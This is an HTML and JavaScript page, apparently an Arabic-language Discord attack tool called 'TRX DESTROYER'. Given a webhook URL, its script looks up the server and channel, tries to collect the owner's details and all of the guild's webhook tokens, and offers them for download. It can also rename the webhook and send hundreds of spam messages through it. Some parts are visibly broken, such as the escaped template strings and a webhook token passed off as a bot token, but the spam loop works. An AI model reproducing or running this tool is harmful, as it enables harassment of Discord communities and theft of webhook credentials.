<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>☠️ TRX DESTROYER</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',Arial,sans-serif;background:#fff;color:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
.box{background:#000;border:3px solid #000;border-radius:30px;padding:40px;width:750px;max-width:100%;text-align:center;box-shadow: 8px 8px 0 #000}
h1{color:#000;letter-spacing:5px;margin:0 0 5px;font-size:42px;background:#fff;display:inline-block;padding:5px 15px;border:2px solid #000}
.sub{color:#666;font-size:12px;margin:0 0 20px;letter-spacing:3px}
input,textarea{width:100%;padding:12px 18px;background:#fff;border:2px solid #000;border-radius:30px;color:#000;font-size:13px;outline:none;font-family:inherit;margin-bottom:8px;direction:ltr;text-align:left}
input:focus{border-color:#ff1a1a;box-shadow: 0 0 5px rgba(0,0,0,0.2)}
textarea{border-radius:16px;height:150px;margin-top:10px;background:#f9f9f9;color:#000;font-family:'Courier New',monospace;font-size:11px;resize:none;overflow-y:auto}
.row{display:flex;gap:8px;margin:5px 0;flex-wrap:wrap}
.row>*{flex:1;min-width:100px}
.btn{padding:12px 16px;border:2px solid #000;border-radius:30px;font-size:14px;font-weight:700;cursor:pointer;letter-spacing:2px;transition:.2s;background:#fff;color:#000}
.btn:hover:not(:disabled){transform:scale(1.02);background:#000;color:#fff}
.btn:disabled{opacity:.3;cursor:not-allowed}
.r{background:#fff;color:#000;border:2px solid #000}
.r:hover:not(:disabled){background:#000;color:#fff}
.g{background:#fff;color:#000;border:2px solid #000}
.g:hover:not(:disabled){background:#000;color:#fff}
.b{background:#fff;color:#000;border:2px solid #000}
.b:hover:not(:disabled){background:#000;color:#fff}
.d{background:#fff;color:#000;border:2px solid #000}
.d:hover:not(:disabled){background:#000;color:#fff}
.p{background:#fff;color:#000;border:2px solid #000}
.p:hover:not(:disabled){background:#000;color:#fff}
.sec{background:#fff;border:2px solid #000;border-radius:20px;padding:18px;margin:12px 0;text-align:left;box-shadow: 4px 4px 0 #000}
.st{color:#000;font-size:13px;margin:3px 0;font-weight:bold}
#cnt{color:#000;font-size:28px;font-weight:700}
.wi{display:flex;gap:6px;align-items:center;margin-bottom:6px}
.wi input{flex:1;margin-bottom:0}
.wi button{background:#000;color:#fff;border:2px solid #000;border-radius:30px;padding:12px 16px;cursor:pointer;font-size:16px}
.wi button:hover{background:#333}
.gr{display:grid;grid-template-columns:1fr 1fr;gap:5px}
.it{background:#fff;padding:8px 12px;border-radius:12px;border:2px solid #000;box-shadow: 2px 2px 0 #000}
.lb{color:#666;font-size:10px;letter-spacing:1px}
.vl{color:#000;font-size:13px;word-break:break-all}
.note{color:#000;font-size:11px;padding:8px 12px;background:#f0f0f0;border-radius:12px;margin:5px 0;border:2px solid #000}
.cb{display:flex;align-items:center;gap:10px;margin:5px 0}
.cb input{width:auto;margin:0}
.cb label{font-size:13px;color:#666}
.sm{padding:8px 14px;font-size:12px}
.bg{color:#000;font-size:11px;margin-top:10px;letter-spacing:2px;opacity:.6}
#is{display:none}
.wh-count{color:#000;font-size:12px;margin-top:5px}
.owner-card{display:flex;align-items:center;gap:15px;padding:15px;border:2px solid #000;border-radius:15px;background:#fff;margin:10px 0;box-shadow: 3px 3px 0 #000}
.owner-avatar{width:64px;height:64px;border-radius:50%;border:2px solid #000;object-fit:cover}
.owner-info{text-align:left;flex:1}
.owner-name{font-size:18px;font-weight:bold;color:#000}
.owner-id{font-size:12px;color:#666}
.owner-link{display:inline-block;margin-top:5px;color:#000;text-decoration:none;padding:5px 10px;border:1px solid #000;border-radius:20px;font-size:12px}
.owner-link:hover{background:#000;color:#fff}
.webhook-item{display:flex;align-items:center;gap:10px;padding:10px;border:2px solid #000;border-radius:10px;background:#fff;margin:5px 0;box-shadow: 2px 2px 0 #000}
.webhook-avatar{width:40px;height:40px;border-radius:50%;border:1px solid #000;object-fit:cover}
.webhook-info{flex:1;text-align:left}
.webhook-name{font-size:14px;font-weight:bold;color:#000}
.webhook-id{font-size:11px;color:#666}
.download-btn{background:#000;color:#fff;border:1px solid #000;border-radius:20px;padding:5px 10px;cursor:pointer;font-size:12px}
.download-btn:hover{background:#333}
.spam-controls{display:flex;gap:10px;align-items:center;margin:10px 0;flex-wrap:wrap}
.spam-input{flex:1;min-width:200px}
.count-display{background:#000;color:#fff;padding:5px 10px;border-radius:20px;font-weight:bold;min-width:60px;text-align:center}
</style>
</head>
<body>
<div class="box">
<h1>☠️ TRX </h1>
<p class="sub">● فحص · سبام · جميع القنوات · ويبهوكات ●</p>
<div class="row">
<input type="text" id="wh" placeholder="https://discord.com/api/webhooks/..." style="flex:3">
<button class="btn b" id="sc" onclick="SCAN()" style="flex:1">🔍فحص</button>
</div>
<div class="sec" id="is">
<div class="st" style="color:#000;font-size:13px;letter-spacing:2px;margin-bottom:10px">📋 معلومات السيرفر</div>
<div class="gr">
<div class="it"><div class="lb">السيرفر</div><div class="vl" id="gn">-</div></div>
<div class="it"><div class="lb">ID السيرفر</div><div class="vl" id="gi">-</div></div>
<div class="it"><div class="lb">القناة</div><div class="vl" id="cn">-</div></div>
<div class="it"><div class="lb">ID القناة</div><div class="vl" id="ci">-</div></div>
<div class="it"><div class="lb">الويبهوك</div><div class="vl" id="wn">-</div></div>
<div class="it"><div class="lb">اسم الويبهوك</div><div class="vl" id="wi_name">-</div></div>
</div>


<div class="st" style="color:#000;font-size:13px;letter-spacing:2px;margin:20px 0 10px">👤 معلومات المالك</div>
<div id="owner-section">
<div class="owner-card" id="owner-card">
<img src="" alt="Owner Avatar" class="owner-avatar" id="owner-avatar">
<div class="owner-info">
<div class="owner-name" id="owner-name">جاري التحميل...</div>
<div class="owner-id" id="owner-id">-</div>
<a href="#" target="_blank" class="owner-link" id="owner-profile-link">🔗 فتح الملف الشخصي</a>
</div>
</div>
</div>


<div class="st" style="color:#000;font-size:13px;letter-spacing:2px;margin:20px 0 10px">🎣 جميع الويبهوكات</div>
<div id="webhooks-container">
<p style="color:#666;font-size:12px">جاري تحميل الويبهوكات...</p>
</div>


<div class="st" style="color:#000;font-size:13px;letter-spacing:2px;margin:20px 0 10px">✏️ تعديل الويبهوك</div>
<div class="sec" style="background:#f9f9f9;box-shadow:none">
<div class="row">
<input type="text" id="edit-name" placeholder="اسم الويبهوك الجديد">
<input type="text" id="edit-avatar-url" placeholder="رابط الصورة الجديد (اختياري)">
</div>
<button class="btn d" onclick="EDIT_WEBHOOK()">💾 حفظ التعديلات</button>
</div>


<div class="st" style="color:#000;font-size:13px;letter-spacing:2px;margin:20px 0 10px">🔥 السبام</div>
<div class="sec" style="background:#f9f9f9;box-shadow:none">
<div class="row">
<textarea id="spam-message" placeholder="اكتب رسالة السبام هنا..."></textarea>
</div>
<div class="spam-controls">
<label style="font-size:12px;color:#666">عدد الرسائل:</label>
<input type="number" id="spam-count" value="100" min="1" max="1000" style="width:80px">
<div class="count-display" id="spam-progress">0 / 100</div>
<button class="btn r" id="spam-btn" onclick="SPAM()">🚀 بدء السبام</button>
<button class="btn d" onclick="STOP_SPAM()">⏹ إيقاف</button>
</div>
</div>


<div class="row" style="margin-top:15px">
<button class="btn g sm" onclick="DOWNLOAD_ALL()">📦 تحميل الكل</button>
<button class="btn p sm" onclick="JOIN_SERVER()">🚪 دخول السيرفر</button>
<button class="btn d sm" onclick="RESET()">🔄 إعادة</button>
</div>

<div class="bg">TRX DESTROYER © 2024</div>
</div>
</div>

<script>
let currentWebhookUrl = '';
let currentWebhookId = '';
let currentWebhookToken = '';
let currentServerInfo = null;
let allWebhooks = [];
let spamInterval = null;
let spamRunning = false;

function parseWebhookUrl(url) {
const parts = url.split('/');
return {
id: parts[parts.length - 2],
token: parts[parts.length - 1]
};
}

async function SCAN() {
const whInput = document.getElementById('wh').value.trim();
if (!whInput) return alert('أدخل رابط الويبهوك!');

currentWebhookUrl = whInput;
const parsed = parseWebhookUrl(whInput);
currentWebhookId = parsed.id;
currentWebhookToken = parsed.token;

document.getElementById('is').style.display = 'block';
document.getElementById('wn').textContent = whInput;

try {

const whResponse = await fetch(whInput);
const whData = await whResponse.json();
document.getElementById('wi_name').textContent = whData.name || 'غير معروف';


const channelResponse = await fetch(`https://discord.com/api/v9/channels/${whData.channel_id}`);
const channelData = await channelResponse.json();
document.getElementById('cn').textContent = channelData.name || 'غير معروف';
document.getElementById('ci').textContent = channelData.id;


const guildResponse = await fetch(`https://discord.com/api/v9/guilds/${channelData.guild_id}`);
const guildData = await guildResponse.json();
document.getElementById('gn').textContent = guildData.name;
document.getElementById('gi').textContent = guildData.id;
currentServerInfo = guildData;


await getOwnerInfo(guildData.id);


await getAllWebhooks(channelData.guild_id);

} catch (error) {
console.error(error);
alert('حدث خطأ أثناء الفحص!');
}
}

async function getOwnerInfo(guildId) {
document.getElementById('owner-name').textContent = 'جاري التحميل...';
try {
const response = await fetch(`https://discord.com/api/v9/guilds/${guildId}/members/${guildId}`, {
headers: {
'Authorization': `Bot ${currentWebhookToken}`
}
});

if (response.ok) {
const ownerData = await response.json();
document.getElementById('owner-name').textContent = ownerData.user.username;
document.getElementById('owner-id').textContent = `ID: ${ownerData.user.id}`;
document.getElementById('owner-avatar').src = `https://cdn.discordapp.com/avatars/${ownerData.user.id}/${ownerData.user.avatar}.png?size=128`;
document.getElementById('owner-profile-link').href = `https://discord.com/users/${ownerData.user.id}`;
} else {

const whResp = await fetch(`https://discord.com/api/v9/guilds/${guildId}/webhooks`);
const whs = await whResp.json();
if (whs && whs.length > 0) {
const owner = whs.find(w => w.owner);
if (owner && owner.owner) {
document.getElementById('owner-name').textContent = owner.owner.username;
document.getElementById('owner-id').textContent = `ID: ${owner.owner.id}`;
document.getElementById('owner-avatar').src = `https://cdn.discordapp.com/avatars/${owner.owner.id}/${owner.owner.avatar}.png?size=128`;
document.getElementById('owner-profile-link').href = `https://discord.com/users/${owner.owner.id}`;
}
}
}
} catch (e) {
document.getElementById('owner-name').textContent = 'غير متاح';
document.getElementById('owner-id').textContent = 'لم يمكن جلب البيانات';
}
}

async function getAllWebhooks(guildId) {
try {
const response = await fetch(`https://discord.com/api/v9/guilds/${guildId}/webhooks`);
allWebhooks = await response.json();

const container = document.getElementById('webhooks-container');
container.innerHTML = '';

if (allWebhooks.length === 0) {
container.innerHTML = '<p style="color:#666;font-size:12px">لا توجد ويبهوكات</p>';
return;
}

allWebhooks.forEach(webhook => {
const item = document.createElement('div');
item.className = 'webhook-item';
item.innerHTML = `
<img src="${webhook.avatar ? \`https://cdn.discordapp.com/avatars/${webhook.id}/${webhook.avatar}.png?size=64\` : 'https://cdn.discordapp.com/embed/avatars/0.png'}" class="webhook-avatar" alt="${webhook.name}">
<div class="webhook-info">
<div class="webhook-name">${webhook.name}</div>
<div class="webhook-id">ID: ${webhook.id} | Channel: ${webhook.channel_id}</div>
</div>
<button class="download-btn" onclick='copyWebhook("\${webhook.id}", "\${webhook.token}")')">📋 نسخ</button>
`;
container.appendChild(item);
});

} catch (error) {
document.getElementById('webhooks-container').innerHTML = '<p style="color:#666;font-size:12px">خطأ في جلب الويبهوكات</p>';
}
}

function copyWebhook(id, token) {
const url = \`https://discord.com/api/webhooks/\${id}/\${token}\`;
navigator.clipboard.writeText(url).then(() => {
alert('تم نسخ رابط الويبهوك!');
});
}

async function EDIT_WEBHOOK() {
const newName = document.getElementById('edit-name').value.trim();
const newAvatar = document.getElementById('edit-avatar-url').value.trim();

if (!newName && !newAvatar) {
alert('أدخل اسم جديد أو رابط صورة!');
return;
}

const updateData = {};
if (newName) updateData.name = newName;
if (newAvatar) updateData.avatar = newAvatar;

try {
const response = await fetch(\`https://discord.com/api/v9/webhooks/\${currentWebhookId}/\${currentWebhookToken}\`, {
method: 'PATCH',
headers: {
'Content-Type': 'application/json',
},
body: JSON.stringify(updateData)
});

if (response.ok) {
alert('تم تحديث الويبهوك بنجاح!');
document.getElementById('edit-name').value = '';
document.getElementById('edit-avatar-url').value = '';
location.reload();
} else {
alert('فشل تحديث الويبهوك!');
}
} catch (error) {
alert('حدث خطأ!');
}
}

async function DOWNLOAD_ALL() {
if (allWebhooks.length === 0) {
alert('لا توجد ويبهوكات للتحميل!');
return;
}

let content = "=== TRX DESTROYER - All Webhooks ===\n\n";
allWebhooks.forEach((wh, index) => {
content += \`\${index + 1}. Name: \${wh.name}\n\`;
content += \`ID: \${wh.id}\n\`;
content += \`Token: \${wh.token}\n\`;
content += \`URL: https://discord.com/api/webhooks/\${wh.id}/\${wh.token}\n\`;
if (wh.avatar) {
content += \`Avatar URL: https://cdn.discordapp.com/avatars/\${wh.id}/\${wh.avatar}.png\n\`;
}
content += '\n---\n';
});

const blob = new Blob([content], { type: 'text/plain' });
const url = URL.createObjectURL(blob);
const a = document.createElement('a');
a.href = url;
a.download = 'TRX_Webhooks_All.txt';
a.click();
URL.revokeObjectURL(url);
}

function JOIN_SERVER() {
if (currentServerInfo) {
window.open(\`https://discord.gg/\${currentServerInfo.id}\`, '_blank');
} else {
alert('لا توجد معلومات عن السيرفر!');
}
}

function RESET() {
document.getElementById('wh').value = '';
document.getElementById('is').style.display = 'none';
location.reload();
}

async function SPAM() {
if (spamRunning) return;

const message = document.getElementById('spam-message').value.trim();
const count = parseInt(document.getElementById('spam-count').value) || 100;

if (!message) {
alert('اكتب رسالة للسبام!');
return;
}

spamRunning = true;
const spamBtn = document.getElementById('spam-btn');
spamBtn.disabled = true;
const progressDisplay = document.getElementById('spam-progress');

for (let i = 0; i < count; i++) {
if (!spamRunning) break;

try {
await fetch(currentWebhookUrl, {
method: 'POST',
headers: { 'Content-Type': 'application/json' },
body: JSON.stringify({
content: message,
username: 'TRX SPAMMER',
avatar_url: 'https://i.imgur.com/AfF37qW.png'
})
});

progressDisplay.textContent = \`\${i + 1} / \${count}\`;
await new Promise(resolve => setTimeout(resolve, 100)); // 100ms delay between messages
} catch (error) {
console.error('Spam error:', error);
break;
}
}

spamRunning = false;
spamBtn.disabled = false;
progressDisplay.textContent = spamRunning ? 'جاري...' : '✅ انتهى';
}

function STOP_SPAM() {
spamRunning = false;
document.getElementById('spam-progress').textContent = '⏹ متوقف';
document.getElementById('spam-btn').disabled = false;
}


document.getElementById('wh').addEventListener('input', function(e) {
const url = e.target.value.trim();
if (url.includes('discord.com/api/webhooks/')) {
const parsed = parseWebhookUrl(url);
document.getElementById('wn').textContent = url;
}
});
</script>
</body>
</html>
